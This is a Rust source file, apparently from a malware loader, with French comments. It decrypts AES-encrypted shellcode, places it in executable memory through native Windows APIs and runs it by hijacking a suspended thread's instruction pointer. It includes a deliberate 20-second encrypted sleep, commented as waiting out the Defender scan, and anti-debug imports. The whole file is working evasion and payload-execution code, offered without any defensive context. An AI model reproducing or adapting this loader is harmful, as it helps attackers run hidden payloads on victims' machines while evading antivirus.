// loader/src/execute/thread_hijack.rs

use crate::{decrypt, evasion::anti_debug::encrypted_sleep, native::call::{CONTEXT, CONTEXT_FULL, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, NativeAPI, PAGE_EXECUTE_READWRITE, PAGE_READWRITE}};
use std::{ffi::c_void, ptr};


pub unsafe fn execute_delayed_thread_hijacking(
    native_api: &NativeAPI,
    encrypted_shellcode: &[u8],
    key: &[u8; 32],
    iv: &[u8; 16]
) -> Result<(), String> {
    
    
    // ÉTAPE 1: Créer thread dummy SANS shellcode
    let mut thread_handle: *mut std::ffi::c_void = ptr::null_mut();
    



    // Fonction légitime qui VA APPELER le déchiffrement plus tard
    extern "system" fn dummy_function_with_decryption_hook(
        encrypted_data: *mut u8,
        data_len: usize,
        key: *mut u8,
        iv: *mut u8
    ) -> u32 {
        unsafe {
            // 1. RECONSTRUIRE les slices
            let encrypted_slice = std::slice::from_raw_parts(encrypted_data, data_len);
            let key_slice = std::slice::from_raw_parts(key, 32);
            let iv_slice = std::slice::from_raw_parts(iv, 16);
            
            // 2. DÉCHIFFRER JUSTE ICI
            match decrypt::decrypt_simple_aes(
                    encrypted_slice, 
                    &key_slice.try_into().expect("Key must be 32 bytes"),
                    &iv_slice.try_into().expect("IV must be 16 bytes")
                ) {
                Ok(shellcode) => {
                    
                    // 3. EXÉCUTER IMMÉDIATEMENT
                    execute_in_current_thread(&shellcode);
                    
                    // Le shellcode sera nettoyé après cette fonction
                    // Pas de variable persistante!
                }
                Err(_) => {
                }
            }
        }
        0
    }



    
    // Préparer les données chiffrées DANS une mémoire PROTÉGÉE
    let (encrypted_ptr, key_ptr, iv_ptr) = prepare_protected_data(
        native_api,
        encrypted_shellcode,
        key,
        iv
    )?;
    
    // Créer le thread avec les paramètres de déchiffrement
    let status = (native_api.rtl_create_user_thread)(
        -1i32 as *mut _,
        ptr::null_mut(),
        1,  // SUSPENDED
        0,
        ptr::null_mut(),
        ptr::null_mut(),
        dummy_function_with_decryption_hook as *mut _,
        encrypted_ptr as *mut _,  // Param 1: données chiffrées
        &mut thread_handle,
        ptr::null_mut(),
    );
    
    if status != 0 {
        cleanup_protected_data(native_api, encrypted_ptr, key_ptr, iv_ptr);
        return Err(format!("Thread creation failed: 0x{:X}", status));
    }
    

    
    // Hijack le contexte pour exécuter notre routine
    hijack_with_delayed_decryption_simple(native_api, encrypted_shellcode, key, iv)?;
    
    Ok(())
}





/// Allouer et protéger les données chiffrées
unsafe fn prepare_protected_data(
    native_api: &NativeAPI,
    encrypted: &[u8],
    key: &[u8; 32],
    iv: &[u8; 16]
) -> Result<(*mut u8, *mut u8, *mut u8), String> {
    
    // Allouer avec PAGE_READWRITE seulement (pas exécutable!)
    let mut enc_addr: *mut std::ffi::c_void = ptr::null_mut();
    let mut enc_size = encrypted.len();
    
    let status = (native_api.nt_allocate_virtual_memory)(
        -1i32 as *mut _,
        &mut enc_addr,
        0,
        &mut enc_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,  // IMPORTANT: Pas exécutable!
    );
    
    if status != 0 {
        return Err(format!("Allocation failed: 0x{:X}", status));
    }
    
    // Copier les données chiffrées
    ptr::copy_nonoverlapping(encrypted.as_ptr(), enc_addr as *mut u8, encrypted.len());
    
    // Allouer pour la clé
    let mut key_addr: *mut std::ffi::c_void = ptr::null_mut();
    let mut key_size = 32;
    
    let status = (native_api.nt_allocate_virtual_memory)(
        -1i32 as *mut _,
        &mut key_addr,
        0,
        &mut key_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    
    ptr::copy_nonoverlapping(key.as_ptr(), key_addr as *mut u8, 32);
    
    // Allouer pour l'IV
    let mut iv_addr: *mut std::ffi::c_void = ptr::null_mut();
    let mut iv_size = 16;
    
    let status = (native_api.nt_allocate_virtual_memory)(
        -1i32 as *mut _,
        &mut iv_addr,
        0,
        &mut iv_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    
    ptr::copy_nonoverlapping(iv.as_ptr(), iv_addr as *mut u8, 16);
    
    Ok((enc_addr as *mut u8, key_addr as *mut u8, iv_addr as *mut u8))
}





unsafe fn execute_in_current_thread(shellcode: &[u8]) {
    use std::ptr;
    
    
    // Allouer mémoire exécutable
    let mut native_api = match crate::native::call::NativeAPI::new() {
        Ok(api) => api,
        Err(_) => {
            return;
        }
    };
    
    let mut base_addr: *mut std::ffi::c_void = ptr::null_mut();
    let mut region_size = shellcode.len();
    
    let status = (native_api.nt_allocate_virtual_memory)(
        -1i32 as *mut _,
        &mut base_addr,
        0,
        &mut region_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    
    if status != 0 {
        return;
    }
    
    // Copier le shellcode
    ptr::copy_nonoverlapping(
        shellcode.as_ptr(),
        base_addr as *mut u8,
        shellcode.len()
    );
    
   
    let func: extern "system" fn() = std::mem::transmute(base_addr);
    func();
    
    // Nettoyer (si jamais on revient ici)
    let _ = (native_api.nt_free_virtual_memory)(
        -1i32 as *mut _,
        &mut base_addr,
        &mut region_size,
        MEM_RELEASE,
    );
    
}




unsafe fn cleanup_protected_data(
    native_api: &NativeAPI,
    encrypted_ptr: *mut u8,
    key_ptr: *mut u8,
    iv_ptr: *mut u8
) {
    
    // Libérer la mémoire pour les données chiffrées
    let mut enc_addr = encrypted_ptr as *mut _;
    let mut enc_size = 0; // La taille sera ignorée avec MEM_RELEASE
    
    let _ = (native_api.nt_free_virtual_memory)(
        -1i32 as *mut _,
        &mut enc_addr,
        &mut enc_size,
        MEM_RELEASE,
    );
    
    // Libérer la clé
    let mut key_addr = key_ptr as *mut _;
    let mut key_size = 0;
    
    let _ = (native_api.nt_free_virtual_memory)(
        -1i32 as *mut _,
        &mut key_addr,
        &mut key_size,
        MEM_RELEASE,
    );
    
    // Libérer l'IV
    let mut iv_addr = iv_ptr as *mut _;
    let mut iv_size = 0;
    
    let _ = (native_api.nt_free_virtual_memory)(
        -1i32 as *mut _,
        &mut iv_addr,
        &mut iv_size,
        MEM_RELEASE,
    );
    
}





/// Thread Hijacking avec déchiffrement via contexte modifié
pub unsafe fn hijack_with_delayed_decryption_simple(
    native_api: &NativeAPI,
    encrypted_shellcode: &[u8],
    key: &[u8; 32],
    iv: &[u8; 16]
) -> Result<(), String> {
    
    // 1. Créer un thread dummy
    let mut thread_handle: *mut std::ffi::c_void = ptr::null_mut();
    
    extern "system" fn dummy_work() -> u32 {
        // Travail léger légitime
        let mut x = 0u64;
        for i in 0..1000000 {
            x = x.wrapping_add(i);
        }
        0
    }
    
    let status = (native_api.rtl_create_user_thread)(
        -1i32 as *mut _,
        ptr::null_mut(),
        1,  // CREATE_SUSPENDED
        0,
        ptr::null_mut(),
        ptr::null_mut(),
        dummy_work as *mut _,
        ptr::null_mut(),
        &mut thread_handle,
        ptr::null_mut(),
    );
    
    if status != 0 {
        return Err(format!("Thread creation failed: 0x{:X}", status));
    }
    
    
    // 2. Attendre le scan Defender
    encrypted_sleep(20000);
    
    
    // 3. DÉCHIFFRER MAINTENANT
    let shellcode = match crate::decrypt::decrypt_simple_aes(encrypted_shellcode, key, iv) {
        Ok(sc) => sc,
        Err(e) => {
            let _ = (native_api.nt_close)(thread_handle);
            return Err(format!("Déchiffrement échoué: {}", e));
        }
    };
    
    
    // 4. Allouer mémoire pour le shellcode
    let mut shellcode_addr: *mut std::ffi::c_void = ptr::null_mut();
    let mut shellcode_size = shellcode.len();
    
    let status = (native_api.nt_allocate_virtual_memory)(
        -1i32 as *mut _,
        &mut shellcode_addr,
        0,
        &mut shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    
    if status != 0 {
        let _ = (native_api.nt_close)(thread_handle);
        return Err(format!("Allocation failed: 0x{:X}", status));
    }
    
    // 5. Copier IMMÉDIATEMENT et exécuter
    ptr::copy_nonoverlapping(
        shellcode.as_ptr(),
        shellcode_addr as *mut u8,
        shellcode.len()
    );
    
    // 6. Hijack le thread avec Native API
    let mut context: CONTEXT = std::mem::zeroed();
    context.ContextFlags = CONTEXT_FULL;
    
    // Obtenir le contexte actuel
    let status = (native_api.nt_get_context_thread)(thread_handle, &mut context);
    if status != 0 {
        cleanup_memory(native_api, shellcode_addr, shellcode_size);
        let _ = (native_api.nt_close)(thread_handle);
        return Err(format!("NtGetContextThread failed: 0x{:X}", status));
    }
    
    // Modifier RIP pour pointer vers le shellcode
    context.Rip = shellcode_addr as u64;
    
    // Appliquer le nouveau contexte
    let status = (native_api.nt_set_context_thread)(thread_handle, &context);
    if status != 0 {
        cleanup_memory(native_api, shellcode_addr, shellcode_size);
        let _ = (native_api.nt_close)(thread_handle);
        return Err(format!("NtSetContextThread failed: 0x{:X}", status));
    }
    
    // 7. Reprendre le thread
    let mut prev_suspend_count = 0;
    let status = (native_api.nt_resume_thread)(thread_handle, &mut prev_suspend_count);
    
    if status != 0 {
        return Err(format!("NtResumeThread failed: 0x{:X}", status));
    }
    
    
    // 8. Attendre un peu puis nettoyer
    encrypted_sleep(2000);
    
    // Fermer handle seulement (la mémoire sera nettoyée quand le shellcode finit)
    let _ = (native_api.nt_close)(thread_handle);
    
    Ok(())
}





unsafe fn cleanup_memory(
    native_api: &NativeAPI,
    addr: *mut std::ffi::c_void,
    size: usize
) {
    let mut cleanup_addr = addr;
    let mut cleanup_size = size;
    
    let _ = (native_api.nt_free_virtual_memory)(
        -1i32 as *mut _,
        &mut cleanup_addr,
        &mut cleanup_size,
        MEM_RELEASE,
    );
}